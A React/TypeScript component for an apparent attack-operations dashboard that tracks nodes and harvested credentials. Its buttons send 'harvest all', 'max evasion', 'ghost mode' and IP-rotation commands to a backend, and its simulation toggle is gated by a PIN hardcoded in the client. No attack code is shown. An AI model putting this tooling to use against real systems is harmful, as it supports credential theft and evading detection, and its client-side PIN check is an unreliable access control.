import React, { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import GlitchNumber from "./GlitchNumber";
import { API_URL } from "../config";

const API_BASE = API_URL;

interface ControlPanelProps {
  sendMessage: (msg: string) => void;
  simulationEnabled: boolean;
  data?: { stats?: { total_nodes: number; active_nodes: number; credentials: number } };
}

const ControlPanel: React.FC<ControlPanelProps> = ({ sendMessage, simulationEnabled, data = {} }) => {
  const stats = data.stats || { total_nodes: 0, active_nodes: 0, credentials: 0 };
  const [executing, setExecuting] = useState<string | null>(null);
  const [simClicks, setSimClicks] = useState(0);
  const [showSimPin, setShowSimPin] = useState(false);
  const [simPin, setSimPin] = useState("");
  const [simPending, setSimPending] = useState(false);

  const executeCommand = async (action: string, params: Record<string, any> = {}, label: string) => {
    setExecuting(label);
    try {
      await fetch(`${API_BASE}/api/command`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ action, params }) });
    } catch {}
    setTimeout(() => setExecuting(null), 1500);
  };

  return (
    <div style={styles.card}>
      <h2 style={styles.title}><span style={{...styles.titleIcon, color: '#00d4ff'}}>&#9679;</span>System Control</h2>
      <div style={styles.statsBar}>
        <StatItem label="Nodes" value={stats.active_nodes} color="#00ff88" />
        <div style={styles.statDivider} />
        <StatItem label="Total" value={stats.total_nodes} color="#00d4ff" />
        <div style={styles.statDivider} />
        <StatItem label="Creds" value={stats.credentials} color="#ffd700" />
      </div>

      <div style={styles.actionGrid}>
        <ActionButton label="Rotate IPs" icon="🔄" color="#00d4ff" loading={executing === "Rotate"} onClick={() => executeCommand("rotate_ips", {}, "Rotate")} />
        <ActionButton label="Harvest All" icon="🎯" color="#ffd700" loading={executing === "Harvest"} onClick={() => executeCommand("harvest_target", { target: "all" }, "Harvest")} />
        <ActionButton label="Max Evasion" icon="🛡️" color="#a855f7" loading={executing === "Evasion"} onClick={() => executeCommand("activate_evasion", { mode: "aggressive" }, "Evasion")} />
        <ActionButton label="Ghost Mode" icon="👻" color="#666" loading={executing === "Ghost"} onClick={() => executeCommand("silent_mode", {}, "Ghost")} />
        <ActionButton label="Enable DoH" icon="🔐" color="#00ff88" loading={executing === "DoH"} onClick={() => executeCommand("enable_doh", {}, "DoH")} />
        <ActionButton label="Full Scan" icon="🔍" color="#ff6ec7" loading={executing === "Scan"} onClick={() => executeCommand("full_scan", {}, "Scan")} />
      </div>

      {/* Simulation toggle — canvas 3-click+PIN */}
      <SimToggle
        key={`sim-${showSimPin}-${simClicks}`}
        simulationEnabled={simulationEnabled}
        showPin={showSimPin}
        pin={simPin}
        setPin={setSimPin}
        clicks={simClicks}
        pending={simPending}
        onCancel={() => { setShowSimPin(false); setSimPin(""); setSimClicks(0); }}
        onConfirm={() => {
          if (simPin === "1381") {
            sendMessage("toggle_sim");
            setShowSimPin(false); setSimPin(""); setSimClicks(0);
            setSimPending(true); setTimeout(() => setSimPending(false), 2000);
          }
        }}
        onClick={() => {
          if (simulationEnabled) { sendMessage("toggle_sim"); setSimPending(true); setTimeout(() => setSimPending(false), 2000); return; }
          const next = simClicks + 1;
          if (next >= 3) { setShowSimPin(true); setSimClicks(0); }
          else { setSimClicks(next); }
        }}
      />

      <div style={styles.statusGrid}>
        <StatusRow label="System" status="Online" color="#00ff88" dotColor="#00ff88" />
        <StatusRow label="Simulation" status={simulationEnabled ? "Active" : "Off"} color={simulationEnabled ? "#00ff88" : "#666"} dotColor={simulationEnabled ? "#00ff88" : "#333"} />
        <StatusRow label="Redis" status="Connected" color="#00ff88" dotColor="#00ff88" />
      </div>
      <div style={styles.infoGrid}>
        <InfoItem label="Redis" value="Connected" color="#00ff88" />
        <InfoItem label="PDF Engine" value="Ready" color="#00d4ff" />
        <InfoItem label="TLS" value="1.3" color="#ffd700" />
      </div>
    </div>
  );
};

const ActionButton: React.FC<{ label: string; icon: string; color: string; onClick: () => void; loading?: boolean }> = ({ label, icon, color, onClick, loading }) => (
  <motion.button whileHover={{ scale: 1.03, borderColor: `${color}40` }} whileTap={{ scale: 0.97 }}
    style={{ ...styles.actionBtn, borderColor: `${color}20`, opacity: loading ? 0.6 : 1 }}
    onClick={onClick} disabled={loading}>
    <span style={{ fontSize: 14 }}>{loading ? '...' : icon}</span>
    <span style={{ color, fontSize: 10, fontWeight: 600 }}>{label}</span>
  </motion.button>
);

const StatItem: React.FC<{ label: string; value: number; color: string }> = ({ label, value, color }) => (
  <div style={{ flex: 1, textAlign: 'center' }}>
    <GlitchNumber value={value} color={color} fontSize={22} fontWeight={700} intensity={0.4} />
    <div style={{ fontSize: 9, color: '#666', textTransform: 'uppercase', letterSpacing: 0.5, marginTop: 2, fontFamily: "'JetBrains Mono', monospace" }}>{label}</div>
  </div>
);

const StatusRow: React.FC<{ label: string; status: string; color: string; dotColor: string }> = ({ label, status, color, dotColor }) => (
  <div style={styles.statusItem}>
    <div style={{ width: 6, height: 6, borderRadius: '50%', backgroundColor: dotColor, boxShadow: `0 0 6px ${dotColor}66`, flexShrink: 0 }} />
    <span style={{ color: '#888', fontSize: 12, flex: 1 }}>{label}</span>
    <span style={{ color, fontSize: 11, fontFamily: "'JetBrains Mono', monospace", fontWeight: 500 }}>{status}</span>
  </div>
);

const InfoItem: React.FC<{ label: string; value: string; color: string }> = ({ label, value, color }) => (
  <div style={styles.infoItem}><span style={styles.infoLabel}>{label}</span><span style={{ color, fontSize: 11, fontFamily: "'JetBrains Mono', monospace" }}>{value}</span></div>
);

function SimToggle({ simulationEnabled, showPin, pin, setPin, clicks, pending, onCancel, onConfirm, onClick }: {
  simulationEnabled: boolean; showPin: boolean; pin: string; setPin: (v: string) => void;
  clicks: number; pending: boolean; onCancel: () => void; onConfirm: () => void; onClick: () => void;
}) {
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const c = canvasRef.current; if (!c) return;
    const ctx = c.getContext("2d"); if (!ctx) return;
    const dpr = window.devicePixelRatio || 1;
    const w = 260; const h = 72;
    c.width = w * dpr; c.height = h * dpr; ctx.scale(dpr, dpr);
    let t = 0;
    const draw = () => {
      t += 0.016;
      ctx.clearRect(0, 0, w, h);
      const col = simulationEnabled ? '#ff4757' : '#44cc88';
      const speed = clicks > 0 ? 3 : simulationEnabled ? 2.5 : 0.5;
      const im = clicks > 0 ? 2.5 : simulationEnabled ? 2 : 1;
      ctx.fillStyle = col + Math.min(0.2, (0.03 + Math.sin(t * speed * 0.8) * 0.02) * im);
      ctx.fillRect(0, 0, w, h);
      const cx = w / 2; const cy = h / 2; const mr = Math.sqrt(cx * cx + cy * cy);
      for (let r = 0; r < 3; r++) {
        const p = ((t * speed + r * 1.4) % 2.6); const rd = 4 + p * (mr / 3);
        const a = Math.max(0, (0.35 - p * 0.13) * im);
        ctx.beginPath(); ctx.arc(cx, cy, rd, 0, Math.PI * 2);
        ctx.strokeStyle = col + Math.floor(a * 255).toString(16).padStart(2, '0');
        ctx.lineWidth = clicks > 0 ? 2 : 1.2; ctx.stroke();
      }
      const ba = Math.min(0.3, (0.1 + Math.sin(t * speed) * 0.06) * im);
      ctx.strokeStyle = col + Math.floor(ba * 255).toString(16).padStart(2, '0');
      ctx.lineWidth = 1.5; ctx.strokeRect(1, 1, w - 2, h - 2);
      ctx.font = 'bold 13px "JetBrains Mono", monospace'; ctx.textAlign = "center"; ctx.textBaseline = "middle";
      const glow = 4 + Math.sin(t * speed) * 3;
      const text = simulationEnabled ? (pending ? '\u23F3 STOPPING...' : '\u25A0 STOP SIM') : clicks > 0 ? ('\u25B6 ' + (3 - clicks) + ' MORE') : pending ? '\u23F3 STARTING...' : '\u25B6 START SIM';
      ctx.fillStyle = col; ctx.shadowColor = col; ctx.shadowBlur = glow; ctx.fillText(text, w / 2, h / 2);
      ctx.shadowBlur = 0; ctx.fillStyle = "#ffffff"; ctx.globalAlpha = 0.6; ctx.fillText(text, w / 2, h / 2); ctx.globalAlpha = 1;
      ctx.font = '7px "JetBrains Mono", monospace'; ctx.fillStyle = col + '88';
      ctx.fillText(simulationEnabled ? '1-CLICK TO STOP' : clicks > 0 ? 'PIN REQUIRED' : '3-CLICK TO START', w / 2, h / 2 + 16);
      requestAnimationFrame(draw);
    };
    const id = requestAnimationFrame(draw); return () => cancelAnimationFrame(id);
  }, [simulationEnabled, clicks, pending]);

  return (
    <div style={{ position: "relative", width: "100%", height: 72, margin: "0 auto 8px" }}>
      {showPin ? (
        <div style={{ display: "flex", gap: 4, alignItems: "center", padding: "6px 8px", background: "rgba(6,6,14,0.8)", borderRadius: 8, border: "1px solid rgba(255,215,0,0.2)", height: 72, boxSizing: "border-box", width: "100%" }}>
          <input autoFocus style={{ width: 80, padding: "5px 6px", background: "rgba(6,6,14,0.8)", border: "1px solid rgba(255,215,0,0.3)", borderRadius: 6, color: "#ffd700", fontFamily: "'JetBrains Mono', monospace", fontSize: 16, outline: "none", textAlign: "center", letterSpacing: "5px" }}
            type="text" maxLength={4} value={pin} onChange={e => setPin(e.target.value)} onKeyDown={e => e.key === "Enter" && onConfirm()} placeholder="0000" />
          <motion.button whileTap={{ scale: 0.9 }} onClick={onConfirm} style={{ padding: "5px 8px", background: "#44cc88", border: "1px solid rgba(68,204,136,0.3)", borderRadius: 6, color: "#06060e", cursor: "pointer", fontWeight: 700, fontSize: 10, fontFamily: "'JetBrains Mono', monospace", whiteSpace: "nowrap" }}>START</motion.button>
          <span onClick={onCancel} style={{ color: "#555", cursor: "pointer", fontSize: 16, padding: "0 4px" }}>✕</span>
        </div>
      ) : (
        <canvas ref={canvasRef} onClick={onClick} style={{ width: "100%", height: 72, borderRadius: 8, cursor: "pointer" }} />
      )}
    </div>
  );
}

const styles: Record<string, React.CSSProperties> = {
  card: { background: 'rgba(12, 14, 28, 0.85)', backdropFilter: 'blur(20px)', borderRadius: 12, border: '1px solid rgba(0, 212, 255, 0.1)', padding: '14px 16px', boxShadow: '0 4px 40px rgba(0, 0, 0, 0.3)', display: 'flex', flexDirection: 'column', overflow: 'hidden', height: '100%', boxSizing: 'border-box' as const },
  title: { margin: '0 0 10px 0', color: '#00d4ff', fontSize: 16, fontWeight: 600, fontFamily: "'JetBrains Mono', monospace", display: 'flex', alignItems: 'center', gap: 8, textShadow: '0 0 8px rgba(0, 212, 255, 0.3)', animation: 'textGlowPulse 3s ease-in-out infinite' },
  titleIcon: { fontSize: 8, animation: 'pulse 2s infinite' },
  statsBar: { display: 'flex', alignItems: 'center', gap: 16, padding: '12px 16px', background: 'rgba(6, 6, 14, 0.5)', borderRadius: 10, border: '1px solid rgba(255, 255, 255, 0.02)', marginBottom: 14 },
  statDivider: { width: 1, height: 30, background: 'linear-gradient(to bottom, transparent, rgba(0, 255, 136, 0.1), transparent)' },
  actionGrid: { display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 6, marginBottom: 12, flex: 1 },
  actionBtn: { display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 4, padding: '10px 6px', background: 'rgba(6, 6, 14, 0.4)', border: '1px solid rgba(255, 255, 255, 0.03)', borderRadius: 8, cursor: 'pointer', fontFamily: "'JetBrains Mono', monospace", transition: 'all 0.2s' },
  statusGrid: { display: 'flex', flexDirection: 'column', gap: 8, marginBottom: 14 },
  statusItem: { display: 'flex', alignItems: 'center', gap: 10, padding: '6px 0' },
  infoGrid: { display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 8 },
  infoItem: { display: 'flex', flexDirection: 'column', gap: 4, padding: '10px 8px', background: 'rgba(6, 6, 14, 0.4)', borderRadius: 8, border: '1px solid rgba(255, 255, 255, 0.02)', textAlign: 'center' },
  infoLabel: { fontSize: 9, color: '#444', textTransform: 'uppercase', letterSpacing: 0.5, fontFamily: "'JetBrains Mono', monospace" },
};

export default ControlPanel;
